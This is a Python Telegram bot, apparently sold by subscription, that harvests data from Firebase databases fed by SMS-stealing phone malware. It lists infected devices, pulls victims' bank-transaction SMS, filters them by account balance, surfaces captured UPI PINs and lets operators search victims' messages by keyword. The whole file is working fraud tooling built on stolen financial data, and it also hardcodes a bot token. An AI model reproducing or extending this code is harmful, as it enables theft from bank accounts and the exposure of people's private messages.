import os
import re
import json
import asyncio
import logging
import sqlite3
from datetime import datetime, timedelta

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.request import HTTPXRequest

# ══════════════════════════════════════════════════════
# ⚙️ MAIN USER BOT CONFIG
# ══════════════════════════════════════════════════════
BOT_TOKEN = "9207432550:AAHLuB2y4UHBx3n14eMUERY99S_vBr1nCc4"
OWNER_ID = 8866149676
OWNER_USERNAME = "@MR_GYANI_9"
CHANNEL_LINK = "https://t.me/MR_GYANI_0"

DATA_DIR = "./data"
os.makedirs(DATA_DIR, exist_ok=True)
DB_PATH = os.path.join(DATA_DIR, "users.db")

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ══════════════════════════════════════════════════════
# 🗄️ DATABASE SETUP (WAL MODE FOR HIGH CONCURRENCY)
# ══════════════════════════════════════════════════════
def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=30.0, check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL")
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, name TEXT, username TEXT, expiry TEXT, banned INTEGER)''')
    conn.commit()
    conn.close()

init_db()

def get_user(user_id):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT expiry, banned FROM users WHERE user_id = ?", (user_id,))
    res = c.fetchone()
    conn.close()
    if res: return {"expiry": res[0], "banned": bool(res[1])}
    return None

def add_user(user_id, name, username):
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, name, username, expiry, banned) VALUES (?, ?, ?, NULL, 0)", (user_id, name, username))
    conn.commit()
    conn.close()

# ══════════════════════════════════════════════════════
# 🔐 AUTH GUARD (Block banned/expired users instantly)
# ══════════════════════════════════════════════════════
async def check_auth(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> bool:
    uid = update.effective_user.id
    if uid == OWNER_ID: return True
    
    user = get_user(uid)
    if not user:
        await update.effective_message.reply_text(f"⛔ <b>ACCESS DENIED</b>\n\nSend /start to register.\nYour ID: <code>{uid}</code>", parse_mode="HTML")
        return False
    if user.get("banned"):
        await update.effective_message.reply_text(f"🚫 <b>YOU ARE BANNED!</b>\n\nContact: {OWNER_USERNAME}", parse_mode="HTML")
        return False
        
    expiry = user.get("expiry")
    if not expiry:
        await update.effective_message.reply_text(f"⛔ <b>NO ACCESS!</b>\n\nContact: {OWNER_USERNAME}", parse_mode="HTML")
        return False
    if expiry != "lifetime":
        try:
            if datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S") < datetime.now():
                await update.effective_message.reply_text(f"⏳ <b>ACCESS EXPIRED!</b>\n\nRenew: {OWNER_USERNAME}", parse_mode="HTML")
                return False
        except: pass
    return True

# ══════════════════════════════════════════════════════
# 🛠️ HELPERS & STATE
# ══════════════════════════════════════════════════════
USER_STATES = {}
ACTIVE_TASKS = {}
_HTTP = None

async def get_http():
    global _HTTP
    if _HTTP is None or _HTTP.closed:
        conn = aiohttp.TCPConnector(limit=200, ttl_dns_cache=300)
        _HTTP = aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=10))
    return _HTTP

def get_user_state(user_id):
    if user_id not in USER_STATES:
        USER_STATES[user_id] = {
            "firebases": {}, "device_state": {}, "scan_active": False,
            "search_active": False, "upi_active": False, "kill_switch": asyncio.Event(),
            "filter_min": 0.0, "filter_max": 0.0
        }
    return USER_STATES[user_id]

async def _cancel_user_tasks(user_id):
    task = ACTIVE_TASKS.pop(user_id, None)
    if task and not task.done():
        task.cancel()
        try: await task
        except: pass
    st = get_user_state(user_id)
    st["scan_active"] = False
    st["search_active"] = False
    st["upi_active"] = False
    st["kill_switch"] = asyncio.Event()

# ══════════════════════════════════════════════════════
# 🚫 PARSERS & FIREBASE HELPERS
# ══════════════════════════════════════════════════════
MUST_HAVE_BANK = re.compile(r'(avl\s*bal|available\s*bal|credited|debited|withdrawn|deposited|a/?c\s*(no|num|ending|\*)|account\s*ending|txn|transaction|upi|imps|neft|balance\s*(is|:)|card\s*(no|ending|\*))', re.IGNORECASE)
BLACKLIST = re.compile(r'(do not copy|forward or share|welcome back|porting|best network|recharge|quota|validity|data\s*usage|pack\s*valid|sms\s*cost|gb/day|unlimited|benefits|thank you for choosing|airtel\s*mobile|jio\s*number|vi\s*number|team\s*jio|team\s*airtel|ppx|ppxUhp|track|survey|offer|free)', re.IGNORECASE)

def is_bank_sms(text: str) -> bool:
    if not text or len(text) < 20: return False
    if BLACKLIST.search(text): return False
    if MUST_HAVE_BANK.search(text) and re.search(r'\d', text):
        if "otp" in text.lower() and "bal" not in text.lower() and "debited" not in text.lower(): return False
        return True
    return False

def extract_balance_float(text: str) -> float:
    for pat in [r'(?:avl|available)\s*(?:bal|balance)?\s*[:=]?\s*(?:rs\.?|inr|₹)?\s*([\d,]+(?:\.\d{1,2})?)', r'(?:balance|bal)\s*(?:is|:|=)?\s*(?:rs\.?|inr|₹)?\s*([\d,]+(?:\.\d{1,2})?)']:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            try: return float(m.group(1).replace(",", ""))
            except: pass
    return -1.0

def extract_amount_float(text: str) -> float:
    t = text.replace("Avl Bal", "XXX").replace("available balance", "XXX").replace("Balance", "XXX")
    m = re.search(r'(?:rs\.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)', t, re.IGNORECASE)
    if m:
        try: return float(m.group(1).replace(",", ""))
        except: pass
    return -1.0

def parse_sms_date(ts_str: str) -> datetime:
    if not ts_str: return datetime.now()
    s = str(ts_str).strip()
    if s.isdigit() and len(s) >= 13:
        try: return datetime.fromtimestamp(int(s) / 1000.0)
        except: pass
    if s.isdigit() and len(s) == 10:
        try: return datetime.fromtimestamp(int(s))
        except: pass
    for fmt in ["%d-%m-%Y %H:%M:%S", "%d-%m-%Y %H:%M", "%d-%m-%Y", "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M", "%Y-%m-%d"]:
        try:
            dt = datetime.strptime(s, fmt)
            if dt.year < 2000: dt = dt.replace(year=dt.year + 2000)
            return dt
        except: pass
    return datetime.now()

def is_recent(ts_str: str, days=30) -> bool:
    try:
        dt = parse_sms_date(ts_str)
        return dt >= (datetime.now() - timedelta(days=days)) or dt > datetime.now() 
    except: return True

async def fb_get(url: str, path: str, timeout=6):
    try:
        session = await get_http()
        async with session.get(f"{url}/{path}.json", timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            if r.status == 200:
                txt = await r.text()
                if txt and txt != "null": return json.loads(txt)
    except: pass
    return None

def parse_devices(data) -> list:
    devs = []
    if not data or not isinstance(data, dict): return devs
    for dev_id, d in data.items():
        if not isinstance(d, dict) or not d.get("status"): continue
        sims = d.get("sims") or []
        if isinstance(sims, dict): sims = list(sims.values())
        devs.append({"id": dev_id, "model": d.get("modelName") or dev_id, "battery": d.get("battery", "?"), "mobNo": d.get("mobNo", ""), "sims": sims, "upipin": d.get("upipin", "")})
    return devs

def parse_msgs(data) -> list:
    msgs = []
    if not data: return msgs
    items = data if isinstance(data, list) else list(data.values()) if isinstance(data, dict) else []
    for m in items:
        if isinstance(m, dict):
            txt = m.get("message") or m.get("body") or m.get("text") or ""
            sender = m.get("sender") or m.get("from") or ""
            ts = str(m.get("timestamp") or m.get("date") or "")
            ts_val = 0
            try: ts_val = float(ts.replace("-", ""))
            except: pass
            if txt: msgs.append({"message": txt, "sender": sender, "timestamp": ts, "_ts": ts_val})
    msgs.sort(key=lambda x: x["_ts"], reverse=True)
    return msgs

# ══════════════════════════════════════════════════════
# 🎨 FORMATTING CARDS
# ══════════════════════════════════════════════════════
def format_deep_scan_card(fb_label, dev, bank_msgs):
    pin = str(dev.get("upipin", "")).split("|")[0].strip()
    carrier = dev["sims"][0].get("carrierName") if dev["sims"] else "—"
    mob = dev['mobNo'] if dev['mobNo'] else "Not Available"
    battery_str = str(dev['battery']).replace('%', '')
    
    lines = [
        f"📁 <b>DATABASE:</b> <code>{fb_label}</code>",
        f"🆔 <b>DEVICE ID:</b> <code>{dev['id']}</code>",
        f"📱 <b>MOBILE:</b> {mob} ({carrier})",
        f"📲 <b>MODEL:</b> {dev['model']}",
        f"🔋 <b>BATTERY:</b> {battery_str}%",
    ]
    if pin: lines.append(f"🔐 <b>UPI PIN:</b> <code>{pin}</code>")
    
    lines.append("\n🏦 <b>BANK TRANSACTIONS:</b>\n━━━━━━━━━━━━━━━━━━━━")
    for i, sms in enumerate(bank_msgs, 1):
        txt = sms['message']
        bal, amt = extract_balance_float(txt), extract_amount_float(txt)
        txt_lower = txt.lower()
        
        if "debit" in txt_lower or "sent" in txt_lower or "withdrawn" in txt_lower: txn_type = "🔴 <b>DEBITED</b>"
        elif "credit" in txt_lower or "received" in txt_lower: txn_type = "🟢 <b>CREDITED</b>"
        else: txn_type = "💳 <b>TRANSACTION</b>"
            
        lines.append(f"<b>{i}. {txn_type}</b>")
        if amt >= 0: lines.append(f"   💰 <b>Amount:</b> ₹{amt:g}")
        if bal >= 0: lines.append(f"   💵 <b>Balance:</b> ₹{bal:g}")
        lines.append(f"   📩 <b>Source:</b> {sms['sender']}")
        lines.append(f"   📄 <i>{txt[:120]}...</i>")
        lines.append("────────────────────")
    return "\n".join(lines)

def format_upi_card(fb_label, dev):
    pin = str(dev.get("upipin", "")).split("|")[0].strip()
    carrier = dev["sims"][0].get("carrierName") if dev["sims"] else "—"
    mob = dev['mobNo'] if dev['mobNo'] else "Not Available"
    return f"🔐 <b>UPI PIN DETECTED</b>\n━━━━━━━━━━━━━━━━━━━━\n📁 <b>DB:</b> <code>{fb_label}</code>\n🆔 <b>DEVICE:</b> <code>{dev['id']}</code>\n📱 <b>MOB:</b> {mob} ({carrier})\n📲 <b>MODEL:</b> {dev['model']}\n🔋 <b>BATTERY:</b> {str(dev['battery']).replace('%','')}%\n━━━━━━━━━━━━━━━━━━━━\n🔑 <b>PIN:</b> <code>{pin}</code>\n📄 <b>RAW:</b> <i>{dev.get('upipin')}</i>"

# ══════════════════════════════════════════════════════
# 🎛 MENUS
# ══════════════════════════════════════════════════════
def get_main_menu(user_id):
    kb = [
        [KeyboardButton("⚡ START SCAN"), KeyboardButton("🛑 STOP SCAN")],
        [KeyboardButton("⚙️ SET FILTER"), KeyboardButton("🫆 UPI PIN SCAN")],
        [KeyboardButton("🔍 CUSTOM SEARCH"), KeyboardButton("🗑 CLEAR ALL")],
        [KeyboardButton("📁 SEND TXT FILE"), KeyboardButton("🔗 PASTE URL")]
    ]
    return ReplyKeyboardMarkup(kb, resize_keyboard=True, is_persistent=True)

# ══════════════════════════════════════════════════════
# 🚀 HANDLERS
# ══════════════════════════════════════════════════════
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    name = update.effective_user.first_name
    
    user = get_user(uid)
    if not user and uid != OWNER_ID:
        add_user(uid, name, update.effective_user.username)
        return await update.message.reply_text(f"⛔ <b>ACCESS DENIED</b>\n\nYour ID: <code>{uid}</code>\nSend this to owner: {OWNER_USERNAME}", parse_mode="HTML")
        
    if not await check_auth(update, ctx): return
    await update.message.reply_text(f"👋 <b>WELCOME, {name.upper()}</b>\n\n💡 <i>Use the menu below to control the bot.</i>", reply_markup=get_main_menu(uid), parse_mode="HTML")

async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update, ctx): return
    uid = update.effective_user.id
    text = update.message.text.strip()
    state = get_user_state(uid)

    if text == "⚡ START SCAN":
        await _cancel_user_tasks(uid)
        state = get_user_state(uid)
        state["scan_active"] = True
        ACTIVE_TASKS[uid] = asyncio.create_task(background_scanner(ctx.bot, uid, state))
        
        min_f = int(state['filter_min']) if state['filter_min'] == int(state['filter_min']) else state['filter_min']
        max_f = int(state['filter_max']) if state['filter_max'] == int(state['filter_max']) else state['filter_max']
        return await update.message.reply_text(f"⚡ <b>SCANNER STARTED</b>\nFilter: ₹{min_f} to ₹{max_f if state['filter_max'] > 0 else '∞'}", parse_mode="HTML")

    elif text == "🛑 STOP SCAN":
        await _cancel_user_tasks(uid)
        return await update.message.reply_text("🛑 <b>STOPPED</b>", parse_mode="HTML")

    elif text == "⚙️ SET FILTER":
        ctx.user_data["awaiting_filter"] = True
        return await update.message.reply_text("⚙️ <b>ENTER MIN & MAX AMOUNT</b>\n\nExample: <code>100 5000</code>", parse_mode="HTML")

    elif text == "🫆 UPI PIN SCAN":
        await _cancel_user_tasks(uid)
        state = get_user_state(uid)
        state["upi_active"] = True
        ACTIVE_TASKS[uid] = asyncio.create_task(scan_upi_pins(ctx, uid, state))
        return await update.message.reply_text("🫆 <b>UPI PIN SCAN STARTED</b>", parse_mode="HTML")

    elif text == "🔍 CUSTOM SEARCH":
        ctx.user_data["awaiting_search"] = True
        return await update.message.reply_text("🔍 <b>TYPE THE KEYWORD TO SEARCH:</b>", parse_mode="HTML")

    elif text == "🗑 CLEAR ALL":
        await _cancel_user_tasks(uid)
        state["firebases"].clear()
        return await update.message.reply_text("🗑 <b>DATA CLEARED</b>", parse_mode="HTML")

    elif text == "📁 SEND TXT FILE":
        return await update.message.reply_text("📁 <b>Upload .txt file with URLs</b>", parse_mode="HTML")

    elif text == "🔗 PASTE URL":
        return await update.message.reply_text("🔗 <b>PASTE YOUR FIREBASE URL:</b>", parse_mode="HTML")

    if ctx.user_data.get("awaiting_filter"):
        ctx.user_data["awaiting_filter"] = False
        try:
            parts = text.split()
            state["filter_min"], state["filter_max"] = float(parts[0]), float(parts[1]) if len(parts) > 1 else 0.0
            await update.message.reply_text(f"✅ <b>FILTER APPLIED</b>\nMin: ₹{state['filter_min']} | Max: ₹{state['filter_max']}", parse_mode="HTML")
        except: await update.message.reply_text("❌ <b>INVALID FORMAT!</b> Example: <code>100 5000</code>", parse_mode="HTML")
        return

    if ctx.user_data.get("awaiting_search"):
        ctx.user_data["awaiting_search"] = False
        await perform_search(update, ctx, text, state)
        return
    
    await process_urls(update, ctx, text)

async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update, ctx): return
    doc = update.message.document
    if not doc.file_name.endswith('.txt'): return await update.message.reply_text("❌ <b>ONLY .TXT FILES ALLOWED!</b>", parse_mode="HTML")
    msg = await update.message.reply_text("⏳ <b>READING FILE...</b>", parse_mode="HTML")
    file = await ctx.bot.get_file(doc.file_id)
    content = (await file.download_as_bytearray()).decode('utf-8')
    await process_urls(update, ctx, content, msg)

# ══════════════════════════════════════════════════════
# ⚡ SCANNER & SEARCH LOGIC
# ══════════════════════════════════════════════════════
async def process_urls(update, ctx, text, msg=None):
    state = get_user_state(update.effective_user.id)
    urls = list(set(re.findall(r'https?://[a-zA-Z0-9\-]+-default-rtdb\.(?:firebaseio\.com|asia-southeast1\.firebasedatabase\.app|europe-west1\.firebasedatabase\.app)', text)))
    if not urls:
        if msg: await msg.edit_text("❌ <b>INVALID FIREBASE URL</b>", parse_mode="HTML")
        return
    if not msg: msg = await update.message.reply_text(f"🔍 <b>PROCESSING {len(urls)} URLs...</b>", parse_mode="HTML")
    else: await msg.edit_text(f"🔍 <b>PROCESSING {len(urls)} URLs...</b>", parse_mode="HTML")
    
    added = 0
    for u in urls:
        if u not in state["firebases"]:
            state["firebases"][u] = {"url": u, "label": u.split("//")[1].split(".")[0]}
            added += 1
    await msg.edit_text(f"✅ <b>{added} NEW URLS ADDED</b>\nTotal: <b>{len(state['firebases'])}</b>", parse_mode="HTML")

async def perform_search(update, ctx, keyword, state):
    state["search_active"] = True
    local_kill = state["kill_switch"] 
    msg = await update.message.reply_text(f"⚡ <b>SEARCHING FOR '{keyword}'...</b>", parse_mode="HTML")
    found_count = 0
    try:
        for fb in list(state["firebases"].values()):
            if local_kill.is_set(): break
            data = await fb_get(fb["url"], "clients")
            if not data: continue
            online = parse_devices(data)
            results = await asyncio.gather(*[fb_get(fb["url"], f"messages/{d['id']}") for d in online])
            for dev, mdata in zip(online, results):
                if local_kill.is_set(): break
                if not mdata: continue
                matches = [m for m in parse_msgs(mdata) if keyword.lower() in m["message"].lower() and is_recent(m["timestamp"])]
                if matches:
                    card = f"🎯 <b>MATCH FOUND</b>\n📁 <b>DB:</b> <code>{fb['label']}</code>\n🆔 <b>ID:</b> <code>{dev['id']}</code>\n📱 {dev['mobNo']}\n━━━━━━━━━━━━━━━━━━━━\n"
                    for i, m in enumerate(matches[:3], 1): card += f"<b>{i}.</b> <i>{m['message'][:150]}...</i>\n\n"
                    try: await update.message.reply_text(card, parse_mode="HTML"); found_count += 1
                    except: pass
        await msg.edit_text(f"✅ <b>SEARCH COMPLETE</b>\nFound <b>{found_count}</b> matches.", parse_mode="HTML")
    except asyncio.CancelledError: pass
    finally: state["search_active"] = False

async def scan_upi_pins(ctx, user_id, state):
    local_kill = state["kill_switch"]
    found = 0
    sem = asyncio.Semaphore(10)
    async def check(fb, dev):
        nonlocal found
        if local_kill.is_set(): return
        async with sem:
            if dev.get("upipin") and str(dev.get("upipin")).lower() != "null":
                try: await ctx.bot.send_message(user_id, format_upi_card(fb["label"], dev), parse_mode="HTML"); found += 1
                except: pass
    try:
        for fb in list(state["firebases"].values()):
            if local_kill.is_set(): return
            data = await fb_get(fb["url"], "clients")
            if data: await asyncio.gather(*[check(fb, d) for d in parse_devices(data)])
        if not local_kill.is_set(): await ctx.bot.send_message(user_id, f"✅ <b>UPI SCAN DONE</b>\nFound <b>{found}</b> PINs.", parse_mode="HTML")
    except asyncio.CancelledError: pass
    finally: state["upi_active"] = False

async def background_scanner(bot, user_id, state):
    kill = state["kill_switch"]
    sem = asyncio.Semaphore(15)
    
    async def process(fb, dev):
        if kill.is_set(): return
        async with sem:
            mdata = await fb_get(fb["url"], f"messages/{dev['id']}")
            if not mdata or kill.is_set(): return
            valid = [m for m in parse_msgs(mdata) if is_bank_sms(m["message"]) and is_recent(m["timestamp"])]
            if not valid: return
            
            latest_bal = extract_balance_float(valid[0]["message"])
            if latest_bal >= 0:
                if state["filter_min"] > 0 and latest_bal < state["filter_min"]: return
                if state["filter_max"] > 0 and latest_bal > state["filter_max"]: return
                
            state_key = f"{fb['url']}|{dev['id']}"
            card = format_deep_scan_card(fb["label"], dev, valid[:5])
            bal_str = str(latest_bal)
            prev = state["device_state"].get(state_key)
            try:
                if prev is None:
                    sent = await bot.send_message(user_id, card, parse_mode="HTML")
                    state["device_state"][state_key] = {"msg_id": sent.message_id, "bal": bal_str}
                elif prev["bal"] != bal_str:
                    await bot.edit_message_text(chat_id=user_id, message_id=prev["msg_id"], text=card, parse_mode="HTML")
                    prev["bal"] = bal_str
            except: pass

    try:
        while not kill.is_set():
            if not state["scan_active"] or not state["firebases"]:
                await asyncio.sleep(0.5)
                continue
            for fb in list(state["firebases"].values()):
                if kill.is_set(): return
                data = await fb_get(fb["url"], "clients")
                if data: await asyncio.gather(*[process(fb, d) for d in parse_devices(data)])
            for _ in range(3):
                if kill.is_set(): return
                await asyncio.sleep(0.5)
    except asyncio.CancelledError: pass

# ══════════════════════════════════════════════════════
# 🚀 MAIN RUNNER
# ══════════════════════════════════════════════════════
async def main():
    app = Application.builder().token(BOT_TOKEN).request(HTTPXRequest(connect_timeout=30, pool_timeout=30)).concurrent_updates(150).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.Document.TXT, handle_document))
    
    await app.bot.delete_webhook(drop_pending_updates=True)
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    logger.info("Main Bot Started!")
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
